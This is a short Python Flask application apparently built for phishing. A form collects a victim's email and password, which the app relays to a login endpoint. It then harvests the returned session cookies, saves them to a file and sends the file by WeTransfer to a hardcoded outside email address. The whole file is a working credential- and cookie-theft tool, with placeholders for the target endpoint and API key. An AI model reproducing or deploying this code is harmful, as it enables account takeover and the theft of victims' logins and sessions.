from flask import Flask, render_template, request
from wetransferapi import WeTransferAPI
import requests

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send_cookies', methods=['POST'])
def send_cookies():
    email = request.form.get('email')
    password = request.form.get('password')

    payload = {'email': email, 'password': password}
    response = requests.post('your_login_endpoint', data=payload)  # Replace 'your_login_endpoint'

    cookies = response.cookies
    cookies_dict = requests.utils.dict_from_cookiejar(cookies)

    with open("my_cookies.txt", "w") as file:
        for key, value in cookies_dict.items():
            file.write(f"{key}={value}\n")

    sender_email = 'your_email@gmail.com'
    sender_password = 'your_password'
    recipient_email = 'wacwacsoufiane65@gmail.com'
    subject = 'Cookies'

    with open('my_cookies.txt', 'r') as file:
        file_content = file.read()

    wt = WeTransferAPI(api_key='your_wetransfer_api_key')  # Replace 'your_wetransfer_api_key'
    transfer = wt.create_transfer()
    file_id = transfer.add_file('my_cookies.txt', file_content)
    transfer.send(sender_email, recipient_email, subject)

    return "Cookies sent"

if __name__ == '__main__':
    app.run(debug=True)